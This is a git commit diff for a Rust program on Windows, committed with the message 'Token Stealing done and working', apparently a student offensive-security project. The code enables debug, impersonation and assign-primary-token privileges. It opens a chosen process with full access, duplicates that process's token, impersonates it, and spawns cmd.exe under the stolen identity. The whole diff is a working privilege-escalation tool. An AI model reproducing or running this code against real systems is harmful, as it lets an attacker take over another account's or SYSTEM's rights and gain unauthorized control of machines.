fae27f14cbee182419d4cd92e2e32fbe914bb309
Theo Le Bever <theo.le-bever@epita.fr>
2024-01-22 18:21:15 +0100

    Token Stealing done and working

--- src/token_stealing.rs
+++ src/token_stealing.rs
@@ -2,238 +2,83 @@ extern crate ntapi;
 extern crate winapi;
 
 use ntapi::ntapi_base::CLIENT_ID;
-use ntapi::ntobapi::NtClose;
+
 use ntapi::ntpsapi::NtOpenProcess;
 use ntapi::ntpsapi::NtSetInformationThread;
 use ntapi::ntpsapi::ThreadImpersonationToken;
+use ntapi::ntpsapi::ZwCurrentThread;
+use ntapi::ntseapi::NtAdjustPrivilegesToken;
 use ntapi::ntseapi::NtDuplicateToken;
 use ntapi::ntseapi::NtOpenProcessToken;
-use ntapi::ntseapi::{NtAdjustPrivilegesToken, SE_DEBUG_PRIVILEGE};
 use std::env;
 use std::ffi::OsStr;
-use std::mem::{size_of, zeroed};
+use std::iter::once;
+use std::mem::{size_of};
 use std::os::windows::ffi::OsStrExt;
-use std::process::abort;
-use std::ptr::null_mut;
-use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
-use winapi::um::handleapi::CloseHandle;
 
+use std::ptr::null_mut;
+use winapi::ctypes::c_void;
+
+use winapi::shared::minwindef::DWORD;
+use winapi::shared::minwindef::FALSE;
+use winapi::shared::minwindef::TRUE;
+use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+
+use winapi::um::processthreadsapi::GetCurrentProcess;
+use winapi::um::processthreadsapi::GetCurrentThread;
 use winapi::um::processthreadsapi::{CreateProcessAsUserW, PROCESS_INFORMATION, STARTUPINFOW};
 use winapi::um::synchapi::WaitForSingleObject;
-
-use winapi::um::winbase::{INFINITE};
+use winapi::um::winbase::INFINITE;
+use winapi::um::winnt::LUID_AND_ATTRIBUTES;
 use winapi::um::winnt::SECURITY_DYNAMIC_TRACKING;
 use winapi::um::winnt::{
     SecurityImpersonation, TokenImpersonation, HANDLE, LUID, MAXIMUM_ALLOWED, PROCESS_ALL_ACCESS,
     SECURITY_QUALITY_OF_SERVICE, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_DUPLICATE,
     TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
 };
-use winapi::um::winuser::SW_SHOW;
 
-fn set_thread_token(thread_handle: HANDLE, token_handle: HANDLE) {
-    unsafe {
-        let status = NtSetInformationThread(
-            thread_handle,
-            ThreadImpersonationToken,
-            token_handle,
-            std::mem::size_of::<HANDLE>() as u32,
-        );
-
-        println!("[+]NtSetInformationThread status: {:#02X}", status);
-
-        if status == 0 {
-            println!("Successfully impersonated the token.");
-        } else {
-            abort();
-        }
-    }
-}
-
-fn duplicate_token(existing_token_handle: HANDLE, new_token_handle: &mut HANDLE) {
-    unsafe {
-        let mut object_attributes = OBJECT_ATTRIBUTES {
-            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
-            RootDirectory: null_mut(),
-            ObjectName: null_mut(),
-            Attributes: 0,
-            SecurityDescriptor: null_mut(),
-            SecurityQualityOfService: null_mut(),
-        };
-        let _security_quality_of_service = SECURITY_QUALITY_OF_SERVICE {
-            Length: std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32,
-            ImpersonationLevel: SecurityImpersonation,
-            ContextTrackingMode: SECURITY_DYNAMIC_TRACKING,
-            EffectiveOnly: false.into(),
-        };
-
-        let status = NtDuplicateToken(
-            existing_token_handle,
-            MAXIMUM_ALLOWED,
-            &mut object_attributes,
-            false.into(), // not effective only
-            TokenImpersonation,
-            new_token_handle,
-        );
-
-        println!("[+]NtDuplicateToken status: {:#02X}", status);
-
-        if status == 0 {
-            println!("Successfully duplicated the token.");
-        } else {
-            abort();
-        }
-    }
-}
-
-fn open_target_token(process_handle: HANDLE, token_handle: &mut HANDLE) {
-    unsafe {
-        let status = NtOpenProcessToken(
-            process_handle,
-            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
-            token_handle,
-        );
-
-        println!("[+]NtOpenProcessToken status: {:#02X}", status);
-
-        if status == 0 {
-            println!("Successfully opened the token.");
-        } else {
-            abort();
-        }
-    }
-}
-
-fn open_target_process(pid: u32, process_handle: &mut HANDLE) {
-    unsafe {
-        let mut object_attributes = OBJECT_ATTRIBUTES {
-            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
-            RootDirectory: null_mut(),
-            ObjectName: null_mut(),
-            Attributes: 0,
-            SecurityDescriptor: null_mut(),
-            SecurityQualityOfService: null_mut(),
-        };
-        let client_id = CLIENT_ID {
-            UniqueProcess: pid as HANDLE,
-            UniqueThread: 0 as HANDLE,
-        };
-
-        let status = NtOpenProcess(
-            process_handle,
-            PROCESS_ALL_ACCESS,
-            &mut object_attributes,
-            &client_id as *const _ as *mut _,
-        );
-
-        println!("[+]NtOpenProcess status: {:#02X}", status);
-
-        if status == 0 {
-            println!("Successfully opened the process.");
-        } else {
-            abort();
-        }
-    }
-}
-
-/// Adjusts the specified privilege in the given token.
-fn adjust_privileges(token_handle: HANDLE, privilege: u32) {
-    let luid = LUID {
-        LowPart: privilege,
-        HighPart: 0,
-    };
-
-    let mut tp = TOKEN_PRIVILEGES {
-        PrivilegeCount: 1,
-        Privileges: [winapi::um::winnt::LUID_AND_ATTRIBUTES {
-            Luid: luid,
-            Attributes: SE_PRIVILEGE_ENABLED,
-        }],
-    };
-
-    unsafe {
-        let status = NtAdjustPrivilegesToken(
-            token_handle,
-            0,
-            &mut tp as *mut TOKEN_PRIVILEGES,
-            0,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-        );
-
-        println!("[+]NtAdjustPrivilegesToken status: {:#02X}", status);
-
-        if status == 0 {
-            println!("Successfully adjusted the privileges.");
-        } else {
-            abort();
-        }
-    }
-}
-
-fn open_process_token(token_handle: &mut HANDLE) {
-    unsafe {
-        let status = NtOpenProcessToken(
-            -1isize as HANDLE, // Current process
-            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
-            token_handle,
-        );
-
-        println!("[+]NtOpenProcessToken status: {:#02X}", status);
-
-        if status == 0 {
-            println!("Successfully opened the token.");
-        } else {
-            abort();
-        }
-    }
-}
-
-fn launch_process_with_token(duplicated_token_handle: HANDLE) {
+fn child_cmd(duplicated_token_handle: HANDLE) {
     let cmd_line_str = "\"C:\\Windows\\system32\\cmd.exe\"";
     let wide_cmd_line: Vec<u16> = OsStr::new(cmd_line_str)
         .encode_wide()
-        .chain(Some(0))
+        .chain(once(0))
         .collect();
-    let lp_cmd_line = wide_cmd_line.as_ptr() as *mut _;
+    let lp_cmd_line = wide_cmd_line.as_ptr();
 
-    let mut desktop_str = "Winsta0\\Default\0";
-    let mut desktop_str = OsStr::new(&mut desktop_str)
-        .encode_wide()
-        .chain(Some(0))
-        .collect::<Vec<u16>>();
-    let lp_desktop = desktop_str.as_mut_ptr();
+    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
+    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+    si.lpDesktop = "Winsta0\\Default\0"
+        .encode_utf16()
+        .chain(once(0))
+        .collect::<Vec<u16>>()
+        .as_ptr() as *mut _;
+    si.wShowWindow = TRUE as u16;
 
-    let mut si: STARTUPINFOW = unsafe { zeroed() };
-    si.cb = size_of::<STARTUPINFOW>() as u32;
-    si.lpDesktop = lp_desktop; // Use the mutable pointer here
-    si.wShowWindow = SW_SHOW as u16;
+    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
 
-    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
-
-    let result = unsafe {
+    let success = unsafe {
         CreateProcessAsUserW(
             duplicated_token_handle,
             null_mut(),
-            lp_cmd_line,
+            lp_cmd_line as *mut _,
             null_mut(),
             null_mut(),
-            0,
+            FALSE,
             0,
             null_mut(),
             null_mut(),
             &mut si,
             &mut pi,
-        )
+        ) != 0
     };
 
-    println!("[+]CreateProcessAsUserW result: {:#02X}", result);
-
-    if result == 0 {
+    if !success {
         // Handle the error, possibly using GetLastError
     } else {
         unsafe {
             WaitForSingleObject(pi.hProcess, INFINITE);
-            CloseHandle(pi.hProcess);
+            winapi::um::handleapi::CloseHandle(pi.hProcess);
+            winapi::um::handleapi::CloseHandle(pi.hThread);
         }
     }
 }
@@ -249,32 +94,161 @@ fn main() {
 
     println!("[+]Stealing token from process #{}.", pid);
 
-    let mut current_token_handle: HANDLE = null_mut();
-    open_process_token(&mut current_token_handle);
-    adjust_privileges(current_token_handle, SE_DEBUG_PRIVILEGE as u32);
+    let current_process_handle: HANDLE = unsafe { GetCurrentProcess() };
+    let mut current_token_handle: HANDLE = unsafe { GetCurrentThread() };
 
+    let result = unsafe {
+        NtOpenProcessToken(
+            current_process_handle,
+            TOKEN_ADJUST_PRIVILEGES,
+            &mut current_token_handle,
+        )
+    };
+    println!("[+]NtOpenProcessToken result: {:#02X}", result);
+
+    let mut tp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
+        PrivilegeCount: 1,
+        Privileges: [LUID_AND_ATTRIBUTES {
+            Luid: LUID {
+                LowPart: 20,
+                HighPart: 0,
+            },
+            Attributes: SE_PRIVILEGE_ENABLED,
+        }],
+    };
+
+    // Call NtAdjustPrivilegesToken to enable SeDebugPrivilege
+    let result = unsafe {
+        NtAdjustPrivilegesToken(
+            current_token_handle,
+            FALSE as u8,
+            &mut tp,
+            size_of::<TOKEN_PRIVILEGES>() as u32,
+            null_mut(),
+            null_mut(),
+        )
+    };
+
+    println!("[+]NtAdjustPrivilegesToken result: {:#02X}", result);
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid.HighPart = 0;
+    tp.Privileges[0].Luid.LowPart = 29;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Call NtAdjustPrivilegesToken to enable SeImpersonatePrivilege
+    let result = unsafe {
+        NtAdjustPrivilegesToken(
+            current_token_handle,
+            FALSE as u8,
+            &mut tp,
+            size_of::<TOKEN_PRIVILEGES>() as u32,
+            null_mut(),
+            null_mut(),
+        )
+    };
+
+    println!("[+]NtAdjustPrivilegesToken result: {:#02X}", result);
+
+    let dw_desired_access: DWORD = PROCESS_ALL_ACCESS;
+    let mut obja: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
+        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
+        RootDirectory: null_mut(),
+        ObjectName: null_mut(),
+        Attributes: 0x00000040,
+        SecurityDescriptor: null_mut(),
+        SecurityQualityOfService: null_mut(),
+    };
+    let mut client_id: CLIENT_ID = CLIENT_ID {
+        UniqueProcess: pid as *mut c_void,
+        UniqueThread: 0 as *mut c_void,
+    };
+
+    // Call NtOpenProcess to open the target process
     let mut target_process_handle: HANDLE = null_mut();
-    open_target_process(pid as u32, &mut target_process_handle);
+    let result = unsafe {
+        NtOpenProcess(
+            &mut target_process_handle,
+            dw_desired_access,
+            &mut obja,
+            &mut client_id,
+        )
+    };
+
+    println!("[+]NtOpenProcess result: {:#02X}", result);
+
     let mut target_token_handle: HANDLE = null_mut();
-    open_target_token(target_process_handle, &mut target_token_handle);
+    let result = unsafe {
+        NtOpenProcessToken(
+            target_process_handle,
+            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
+            &mut target_token_handle,
+        )
+    };
+
+    println!("[+]NtOpenProcessToken result: {:#02X}", result);
 
     let mut duplicated_token_handle: HANDLE = null_mut();
-    duplicate_token(target_token_handle, &mut duplicated_token_handle);
-    adjust_privileges(duplicated_token_handle, SE_DEBUG_PRIVILEGE as u32);
+    let mut obja2: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
+        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
+        RootDirectory: null_mut(),
+        ObjectName: null_mut(),
+        Attributes: 0x00000040,
+        SecurityDescriptor: null_mut(),
+        SecurityQualityOfService: null_mut(),
+    };
+    let security_quality_of_service = SECURITY_QUALITY_OF_SERVICE {
+        Length: size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32,
+        ImpersonationLevel: SecurityImpersonation,
+        ContextTrackingMode: SECURITY_DYNAMIC_TRACKING,
+        EffectiveOnly: FALSE as u8,
+    };
 
-    // Get a handle to the current thread
-    let current_thread_handle = unsafe { winapi::um::processthreadsapi::GetCurrentThread() };
+    obja2.SecurityQualityOfService = &security_quality_of_service as *const _ as *mut _;
+    // Call NtDuplicateToken to duplicate the target token
+    let result = unsafe {
+        NtDuplicateToken(
+            target_token_handle,
+            MAXIMUM_ALLOWED,
+            &mut obja2,
+            FALSE as u8,
+            TokenImpersonation,
+            &mut duplicated_token_handle,
+        )
+    };
 
-    set_thread_token(current_thread_handle, target_token_handle);
+    println!("[+]NtDuplicateToken result: {:#02X}", result);
 
-    // Launch a new process with the duplicated token
-    launch_process_with_token(duplicated_token_handle);
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid.HighPart = 0;
+    tp.Privileges[0].Luid.LowPart = 3;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    // Close all handles
-    unsafe {
-        NtClose(current_token_handle);
-        NtClose(target_process_handle);
-        NtClose(target_token_handle);
-        NtClose(duplicated_token_handle);
-    }
+    // Call NtAdjustPrivilegesToken to enable SeAssignPrimaryPrivilege
+    let result = unsafe {
+        NtAdjustPrivilegesToken(
+            duplicated_token_handle,
+            FALSE as u8,
+            &mut tp,
+            size_of::<TOKEN_PRIVILEGES>() as u32,
+            null_mut(),
+            null_mut(),
+        )
+    };
+
+    println!("[+]NtAdjustPrivilegesToken result: {:#02X}", result);
+
+    // Call NtSetInformationThread to set the impersonation token
+    let result = unsafe {
+        NtSetInformationThread(
+            ZwCurrentThread,
+            ThreadImpersonationToken,
+            &mut duplicated_token_handle as *mut _ as *mut c_void,
+            size_of::<HANDLE>() as u32,
+        )
+    };
+
+    println!("[+]NtSetInformationThread result: {:#02X}", result);
+
+    child_cmd(duplicated_token_handle);
 }
